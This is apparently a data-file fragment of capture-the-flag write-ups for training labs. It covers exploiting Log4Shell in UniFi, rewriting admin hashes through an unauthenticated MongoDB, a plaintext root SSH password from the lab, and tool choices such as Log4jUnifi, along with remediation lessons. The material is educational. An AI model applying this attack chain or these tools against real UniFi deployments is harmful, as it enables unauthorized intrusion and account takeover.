Unauthenticated MongoDB: The MongoDB instance ran on 127.0.0.1:27117 with no --auth flag, allowing any local user (including the unifi service account from the shell) to connect and modify any collection. MongoDB should be started with --auth enabled, and the UniFi application user should be granted only the minimum necessary database permissions (read/write to ace, not the ability to modify admin credentials).

Plaintext SSH Credentials in Web UI: The Site settings page exposed root:NotACrackablePassword4U2022 in plaintext. SSH credentials for managed infrastructure should never be stored in plaintext in an application's web interface. Ubiquiti should use SSH key-based authentication for device management rather than storing passwords that any administrator-level web user can read.

SHA-512 Without Salt Control: The x_shadow field stored SHA-512 hashes, but the hash replacement attack worked because the database was writable without authentication and the hash could be substituted wholesale. Defense-in-depth would include database authentication (see above) and application-level integrity checks on credential fields, but the real fix is the MongoDB auth issue — without database write access, the hash replacement is impossible.

writeups.takeawayHtml: Log4Shell is the cleanest example of why logging user-controlled input without sanitization is dangerous: the exploit isn't in the application logic, it's in the logging framework processing the data before the application even sees it. The JNDI lookup fires at the log statement — the rest of the application's input validation, authentication checks, and business logic all happen after the RCE has already occurred. There's no patch to the application that fixes this; it requires upgrading the library. The escalation path reinforces the principle of least privilege for service accounts. The unifi OS user could connect to MongoDB and rewrite admin credentials because MongoDB had no authentication requirement. A properly configured environment would have MongoDB require authentication, the UniFi service account would have only the permissions it needs for application operation, and the SSH root credentials would never be stored in a plaintext-readable field in the application's web UI. Any one of those three controls breaks the escalation chain.
writeups.againHtml:
I'd skip JNDI-Exploit-Kit entirely and go straight to Log4jUnifi. When the target is a specific known-vulnerable application (UniFi), a tool built for that application beats a generic one. The generic tool's gadget chains are a compatibility gamble; the specialized tool handles the environment specifics for you.

For the MongoDB step — ps aux | grep mongo or ps aux | grep 27 to find the port before even trying ss or netstat. Service processes listed in ps give you port numbers directly from their command-line arguments, and ps is almost always in PATH even when network tools aren't.

The typo on the username path (michiael vs michael) is embarrassing in retrospect. ls /home takes two seconds and should always be the first step before guessing home directory names. Lesson noted, probably not learned permanently.

writeups.title: Oopsie
writeups.summary: Apache box running a repair management web app. Guest login is available but the upload feature is locked behind an authorization check that trusts…
writeups.takeaway: Authorization in web applications has to live on the server — never in a cookie the user controls. The entire Oopsie attack chain ran on one assumption the developers got wrong: that a client-supplied user value is trustworthy. Fix that one mistake and there's no IDOR, no cookie manipulation, and no path to the upload form.
